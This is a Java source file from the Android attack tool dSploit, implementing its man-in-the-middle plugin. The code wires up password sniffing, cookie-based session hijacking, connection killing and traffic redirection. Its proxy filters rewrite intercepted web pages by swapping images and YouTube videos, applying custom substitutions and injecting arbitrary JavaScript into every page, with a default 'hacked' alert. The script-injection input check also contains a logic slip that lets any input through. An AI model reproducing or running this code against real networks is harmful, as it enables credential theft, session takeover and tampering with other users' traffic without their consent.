/*
 * This file is part of the dSploit.
 *
 * Copyleft of Simone Margaritelli aka evilsocket <evilsocket@gmail.com>
 *
 * dSploit is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * dSploit is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with dSploit.  If not, see <http://www.gnu.org/licenses/>.
 */
package it.evilsocket.dsploit.plugins.mitm;

import java.util.ArrayList;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.util.regex.PatternSyntaxException;

import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.provider.MediaStore.MediaColumns;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.View;
import android.view.View.OnClickListener;
import android.view.ViewGroup;
import android.widget.ArrayAdapter;
import android.widget.ImageView;
import android.widget.ListView;
import android.widget.ProgressBar;
import android.widget.TextView;
import android.widget.Toast;
import it.evilsocket.dsploit.R;
import it.evilsocket.dsploit.core.System;
import it.evilsocket.dsploit.core.Plugin;
import it.evilsocket.dsploit.gui.dialogs.RedirectionDialog;
import it.evilsocket.dsploit.gui.dialogs.RedirectionDialog.RedirectionDialogListener;
import it.evilsocket.dsploit.gui.dialogs.CustomFilterDialog;
import it.evilsocket.dsploit.gui.dialogs.CustomFilterDialog.CustomFilterDialogListener;
import it.evilsocket.dsploit.gui.dialogs.ErrorDialog;
import it.evilsocket.dsploit.gui.dialogs.FatalDialog;
import it.evilsocket.dsploit.gui.dialogs.InputDialog;
import it.evilsocket.dsploit.gui.dialogs.InputDialog.InputDialogListener;
import it.evilsocket.dsploit.net.Target;
import it.evilsocket.dsploit.net.http.proxy.Proxy;
import it.evilsocket.dsploit.net.http.proxy.Proxy.ProxyFilter;
import it.evilsocket.dsploit.plugins.mitm.SpoofSession.OnSessionReadyListener;

public class MITM extends Plugin 
{
	private static final String  TAG 		     = "MITM";
	private static final int     SELECT_PICTURE  = 1010;
	private static final Pattern YOUTUBE_PATTERN = Pattern.compile( "youtube\\.com/.*\\?v=([a-z0-9_-]+)", Pattern.CASE_INSENSITIVE );
	
	private ListView      	  mActionListView  = null;
	private ActionAdapter 	  mActionAdapter   = null;
	private ArrayList<Action> mActions  	   = new ArrayList<Action>();	
	private Intent			  mImagePicker	   = null;
	private ProgressBar       mCurrentActivity = null;
	private SpoofSession	  mSpoofSession	   = null;
	
	static class Action
	{
		public int			   resourceId;
		public String 		   name;
		public String 		   description;
		public OnClickListener listener;
		
		public Action( String name, String description, int resourceId, OnClickListener listener ) {
			this.resourceId  = resourceId;
			this.name 		 = name;
			this.description = description;
			this.listener 	 = listener;
		}
		
		public Action( String name, String description, OnClickListener listener ) {
			this( name, description, R.drawable.action_plugin_48, listener );
		}
	}
	
	class ActionAdapter extends ArrayAdapter<Action> 
	{
		private int 			  mLayoutId = 0;
		private ArrayList<Action> mActions;
		
		public class ActionHolder
		{		
			ImageView   icon;
			TextView    name;
			TextView    description;
			ProgressBar activity;
		}
		
		public ActionAdapter( int layoutId, ArrayList<Action> actions ) {
	        super( MITM.this, layoutId, actions );
	        	       
	        mLayoutId = layoutId;
	        mActions  = actions;
	    }
		
		@Override
	    public View getView( int position, View convertView, ViewGroup parent ) {		
	        View 		 row    = convertView;
	        ActionHolder holder = null;
	        
	        if( row == null )
	        {
	            LayoutInflater inflater = ( LayoutInflater )MITM.this.getSystemService( Context.LAYOUT_INFLATER_SERVICE );
	            row = inflater.inflate( mLayoutId, parent, false );
	            
	            holder = new ActionHolder();
	            
	            holder.icon		   = ( ImageView )row.findViewById( R.id.actionIcon );
	            holder.name        = ( TextView )row.findViewById( R.id.itemName );
	            holder.description = ( TextView )row.findViewById( R.id.itemDescription );
	            holder.activity    = ( ProgressBar )row.findViewById( R.id.itemActivity );
	            
	            row.setTag(holder);
	        }
	        else
	        {
	            holder = ( ActionHolder )row.getTag();
	        }
	        
	        Action action = mActions.get( position );

	        holder.icon.setImageResource( action.resourceId );
	        holder.name.setText( action.name );
	        holder.description.setText( action.description );
	        
	        row.setOnClickListener( action.listener );
	        	        
	        return row;
	    }
	}
	
	public MITM( ) {
		super
		( 
		    "MITM", 
		    "Perform various man-in-the-middle attacks, such as network sniffing, traffic manipulation, etc.", 
		    new Target.Type[]{ Target.Type.ENDPOINT, Target.Type.NETWORK }, 
		    R.layout.plugin_mitm,
		    R.drawable.action_mitm_48 
	    );		
	}
	
	@Override
	protected void onActivityResult( int request, int result, Intent intent ) { 
	    super.onActivityResult( request, result, intent  ); 

	    if( request == SELECT_PICTURE && result == RESULT_OK )
	    {
	    	try
	    	{
		    	Uri    uri 		= intent.getData();
		    	String fileName = null,
		    		   mimeType = null;
		    	
		    	if( uri != null ) 
		    	{
		    		String[] columns = { MediaColumns.DATA };
		            Cursor 	 cursor  = getContentResolver().query( uri, columns, null, null, null );
		            cursor.moveToFirst();

		            int index = cursor.getColumnIndex( MediaColumns.DATA );
		            if( index != -1 ) 
		            {
		            	fileName = cursor.getString( index );
		            } 
		            
		            cursor.close();
		        }
	            
		    	if( fileName == null )
		    	{
		    		setStoppedState();
		    		new ErrorDialog( "Error", "Could not determine file path.", MITM.this ).show();
		    	}
		    	else
		    	{		    
		    		mimeType 	  = System.getImageMimeType( fileName );		    		
		    		mSpoofSession = new SpoofSession( true, true, fileName, mimeType );
		    		
		    		if( mCurrentActivity != null )
		    			mCurrentActivity.setVisibility( View.VISIBLE );
		    		
		    		mSpoofSession.start( new OnSessionReadyListener() {						
						@Override
						public void onSessionReady() {
							MITM.this.runOnUiThread( new Runnable(){
								@Override
								public void run() {									
									System.getProxy().setFilter( new Proxy.ProxyFilter(){
										@Override
										public String onDataReceived( String headers, String data ) {
											String resource = System.getServer().getResourceURL();
											
											// handle img tags
											data = data.replaceAll
											( 
											  "(?i)<img([^/]+)src=['\"][^'\"]+['\"]", 
											  "<img$1src=\"" + resource + "\"" 
											);
																		
											// handle css background declarations
											data = data.replaceAll
											( 
											  "(?i)background\\s*(:|-)\\s*url\\s*[\\(|:][^\\);]+\\)?.*", 
											  "background: url(" + resource + ")" 
											);

											return data;
										}
									});
									
									Toast.makeText( MITM.this, "Tap again to stop.", Toast.LENGTH_LONG ).show();
								}
							});
						}
					});			    		
		    	}		    	
	    	}
	    	catch( Exception e )
	    	{
	    		System.errorLogging( TAG, e );
	    	}
	    }	    
	}
	
	private void setStoppedState() {
		int rows = mActionListView.getChildCount(),
			i;
		boolean somethingIsRunning = false;
		ActionAdapter.ActionHolder holder;
		View row;
		
		for( i = 0; i < rows && somethingIsRunning == false; i++ )
		{
			if( ( row = mActionListView.getChildAt( i ) ) != null )
			{
				holder = ( ActionAdapter.ActionHolder )row.getTag();
				if( holder.activity.getVisibility() == View.VISIBLE )
					somethingIsRunning = true;
			}
		}
		
		if( somethingIsRunning )
		{
			Log.d( TAG, "Stopping current jobs ..." );
						
			if( mSpoofSession != null )
			{
				mSpoofSession.stop();
				mSpoofSession = null;
			}

			for( i = 0; i < rows; i++ )
			{
				if( ( row = mActionListView.getChildAt( i ) ) != null )
				{
					holder = ( ActionAdapter.ActionHolder )row.getTag();
					holder.activity.setVisibility( View.INVISIBLE );
				}
			}			
		}
	}

	@Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);   
        
        if( System.getProxy() == null )
        	new FatalDialog( "Error", "Could not create proxy instance.", MITM.this ).show();

        mActions.add( new Action
        ( 
        	"Simple Sniff", 
        	"Only redirect target's traffic through this device, useful when using a network sniffer like 'Sharp' for android.", 
        	R.drawable.action_sniffer_48,
        	new OnClickListener(){
			@Override
			public void onClick( View v ) 
			{
				setStoppedState();
				
				startActivity
                ( 
                  new Intent
                  ( 
                	MITM.this, 
                	Sniffer.class
                  ) 
                );
                overridePendingTransition(R.anim.slide_in_left, R.anim.slide_out_left);
			}
		}));
        
        mActions.add( new Action
        ( 
        	"Password Sniffer", 
        	"Sniff passwords of many protocols such as http, ftp, imap, imaps, irc, msn, etc from the target.",
        	R.drawable.action_passwords_48,
        	new OnClickListener(){
        	@Override
			public void onClick( View v ) 
			{
        		setStoppedState();
        		
				startActivity
                ( 
                  new Intent
                  ( 
                	MITM.this, 
                	PasswordSniffer.class
                  ) 
                );
                overridePendingTransition(R.anim.slide_in_left, R.anim.slide_out_left);
			}
		}));
        
        mActions.add( new Action
        ( 
        	"Session Hijacker", 
        	"Listen for cookies on the network and hijack sessions.", 
        	R.drawable.action_hijack_48,
        	new OnClickListener(){
			@Override
			public void onClick( View v ) 
			{				
				setStoppedState();
				
				startActivity
                ( 
                  new Intent
                  ( 
                	MITM.this, 
                	Hijacker.class
                  ) 
                );
                overridePendingTransition(R.anim.slide_in_left, R.anim.slide_out_left);
			}
		}));
        
        mActions.add( new Action
        ( 
        	"Kill Connections", 
        	"Kill connections preventing the target to reach any website or server.",
        	R.drawable.action_kill_48,
        	new OnClickListener(){
			@Override
			public void onClick(View v) {
				ProgressBar activity = ( ProgressBar )v.findViewById( R.id.itemActivity );

				if( activity.getVisibility() == View.INVISIBLE )
				{
					if( System.getCurrentTarget().getType() != Target.Type.ENDPOINT )
						new ErrorDialog( "Error", "Connection killer can be used only against single endpoints.", MITM.this ).show();
					
					else
					{					
						setStoppedState();
						
						activity.setVisibility( View.VISIBLE );
						
						Toast.makeText( MITM.this, "Tap again to stop.", Toast.LENGTH_LONG ).show();
						
						ConnectionKiller.start();
					}
				}
				else
				{
	
					ConnectionKiller.stop();
								
					activity.setVisibility( View.INVISIBLE );
				}
			}
		}));
        
        mActions.add( new Action
        ( 
        	"Redirect", 
        	"Redirect all the http traffic to another address.",
        	R.drawable.action_redirect_48,
        	new OnClickListener(){
			@Override
			public void onClick(View v) {
	
				final ProgressBar activity = ( ProgressBar )v.findViewById( R.id.itemActivity );

				if( activity.getVisibility() == View.INVISIBLE )
				{
					setStoppedState();
	
					new RedirectionDialog( "Redirection", MITM.this, new RedirectionDialogListener(){
						@Override
						public void onInputEntered( String address, String port ) {
							if( address.isEmpty() == false && port.isEmpty() == false )
							{
								try
								{
									int iport = Integer.parseInt( port );
									
									if( iport <= 0 || iport > 65535 )
										throw new Exception();
									
									activity.setVisibility( View.VISIBLE );
									Toast.makeText( MITM.this, "Tap again to stop.", Toast.LENGTH_LONG ).show();
									
									final String faddress = address;
									final int	 fport	  = iport;
									
									mSpoofSession = new SpoofSession( );
									
									mSpoofSession.start( new OnSessionReadyListener() {										
										@Override
										public void onSessionReady() {
											System.getProxy().setRedirection( faddress, fport );											
										}
									});																	
								}
								catch( Exception e )
								{
									new ErrorDialog( "Error", "Invalid port specified.", MITM.this ).show();
								}					
							}
							else
								new ErrorDialog( "Error", "Invalid address and/or port specified.", MITM.this ).show();							
						}
					}).show();
				}
				else				
					setStoppedState();				
			}
		}));
        
        mActions.add( new Action
        (
        	"Replace Images", 
        	"Replace all images on webpages with the specified one.", 
        	R.drawable.action_image_48,
        	new OnClickListener(){
			@Override
			public void onClick(View v) {
				ProgressBar activity = ( ProgressBar )v.findViewById( R.id.itemActivity );

				if( activity.getVisibility() == View.INVISIBLE )
				{
					setStoppedState();

					mCurrentActivity = activity;

					startActivityForResult( mImagePicker, SELECT_PICTURE );  
				}
				else
				{			
					mCurrentActivity = null;
					setStoppedState();
				}
			}
		}));
        
        mActions.add( new Action
        (
        	"Replace Videos", 
        	"Replace all youtube videos on webpages with the specified one.", 
        	R.drawable.action_youtube_48,
        	new OnClickListener(){
			@Override
			public void onClick(View v) {
				final ProgressBar activity = ( ProgressBar )v.findViewById( R.id.itemActivity );

				if( activity.getVisibility() == View.INVISIBLE )
				{
					setStoppedState();
					
					new InputDialog
					( 
						"Video", 
						"Enter the url of the video :", 
						"http://www.youtube.com/watch?v=dQw4w9WgXcQ", 
						true,
						MITM.this, 
						new InputDialogListener(){
						@Override
						public void onInputEntered( String input ) 
						{
							final String video = input.trim();
							Matcher matcher = YOUTUBE_PATTERN.matcher( input );
							
							if( video.isEmpty() == false && matcher != null && matcher.find() )
							{
								final String videoId = matcher.group( 1 );
								
								activity.setVisibility( View.VISIBLE );
								
								Toast.makeText( MITM.this, "Tap again to stop.", Toast.LENGTH_LONG ).show();
								
								mSpoofSession = new SpoofSession( );
								mSpoofSession.start( new OnSessionReadyListener() {									
									@Override
									public void onSessionReady() {
										System.getProxy().setFilter( new Proxy.ProxyFilter() {					
											@Override
											public String onDataReceived( String headers, String data ) {												
												if( data.matches( "(?s).+/v=[a-zA-Z0-9_-]+.+" ) )
													data = data.replaceAll( "(?s)/v=[a-zA-Z0-9_-]+", "/v=" + videoId );
												
												else if( data.matches( "(?s).+/v/[a-zA-Z0-9_-]+.+" ) )
													data = data.replaceAll( "(?s)/v/[a-zA-Z0-9_-]+", "/v/" + videoId );
												
												else if( data.matches( "(?s).+/embed/[a-zA-Z0-9_-]+.+" ) )
													data = data.replaceAll( "(?s)/embed/[a-zA-Z0-9_-]+", "/embed/" + videoId );										
												
												return data;
											}
										});								
									}
								});											
							}
							else
								new ErrorDialog( "Error", "Invalid youtube video.", MITM.this ).show();
						}} 
					).show();	
				}
				else
					setStoppedState();				
			}
		}));

        mActions.add( new Action
        ( 
        	"Script Injection", 
        	"Inject a javascript in every visited webpage.",
        	R.drawable.action_injection_48,
        	new OnClickListener(){
			@Override
			public void onClick(View v) {
				final ProgressBar activity = ( ProgressBar )v.findViewById( R.id.itemActivity );

				if( activity.getVisibility() == View.INVISIBLE )
				{
					setStoppedState();
					
					new InputDialog
					( 
						"Javascript", 
						"Enter the js code to inject :", 
						"<script type=\"text/javascript\">\n" +
						"  alert('This site has been hacked with dSploit!');\n" +
						"</script>", 
						true,
						MITM.this, 
						new InputDialogListener(){
						@Override
						public void onInputEntered( String input ) 
						{
							final String js = input.trim();
							if( js.isEmpty() == false || js.startsWith("<script") == false )
							{
								activity.setVisibility( View.VISIBLE );
								
								Toast.makeText( MITM.this, "Tap again to stop.", Toast.LENGTH_LONG ).show();
									
								mSpoofSession = new SpoofSession( );
								mSpoofSession.start( new OnSessionReadyListener() {									
									@Override
									public void onSessionReady() {
										System.getProxy().setFilter( new Proxy.ProxyFilter() {					
											@Override
											public String onDataReceived( String headers, String data ) {												
												return data.replaceAll( "(?i)</head>", js + "</head>" );
											}
										});												
									}
								});
							}
							else
								new ErrorDialog( "Error", "Invalid javascript code, remember to use <script></script> enclosing tags.", MITM.this ).show();
						}} 
					).show();	
				}
				else
					setStoppedState();
			}
		}));
    
        mActions.add( new Action( "Custom Filter", "Replace custom text on webpages with the specified one.", new OnClickListener(){
			@Override
			public void onClick(View v) {
				final ProgressBar activity = ( ProgressBar )v.findViewById( R.id.itemActivity );

				if( activity.getVisibility() == View.INVISIBLE )
				{
					setStoppedState();
					
					new CustomFilterDialog( "Custom Filter", MITM.this, new CustomFilterDialogListener(){
						@Override
						public void onInputEntered( final ArrayList<String> from, final ArrayList<String> to ) {
							
							if( from.isEmpty() == false && to.isEmpty() == false )
							{
								try 
								{
									for( String exp : from )
									{
										Pattern.compile( exp );
									}
									
									activity.setVisibility( View.VISIBLE );
									
									Toast.makeText( MITM.this, "Tap again to stop.", Toast.LENGTH_LONG ).show();
										
									mSpoofSession = new SpoofSession();
									mSpoofSession.start( new OnSessionReadyListener() {										
										@Override
										public void onSessionReady() {
											System.getProxy().setFilter( new ProxyFilter() {												
												@Override
												public String onDataReceived( String headers, String data ) {
													for( int i = 0; i < from.size(); i++ )
													{
														data = data.replaceAll( from.get( i ), to.get( i ) );
													}
													
													return data;
												}
											});
										}
									});									
								} 
								catch( PatternSyntaxException e ) 
								{
									new ErrorDialog( "Error", "Invalid regular expression: " + e.getDescription() + " .", MITM.this ).show();
						        }																	
							}
							else
								new ErrorDialog( "Error", "Invalid regular expression.", MITM.this ).show();
						}} 
					).show();
				}
				else
					setStoppedState();
			}
		}));
        
        mActionListView = ( ListView )findViewById( R.id.actionListView );
        mActionAdapter  = new ActionAdapter( R.layout.plugin_mitm_list_item, mActions );
        
        mActionListView.setAdapter( mActionAdapter );     
        
		mImagePicker = new Intent( Intent.ACTION_PICK, android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI );
		mImagePicker.setType("image/*");
		mImagePicker.putExtra( Intent.EXTRA_LOCAL_ONLY, true );
	}
	
	@Override
	public void onBackPressed() {
	    setStoppedState();	
	    super.onBackPressed();
	}
}
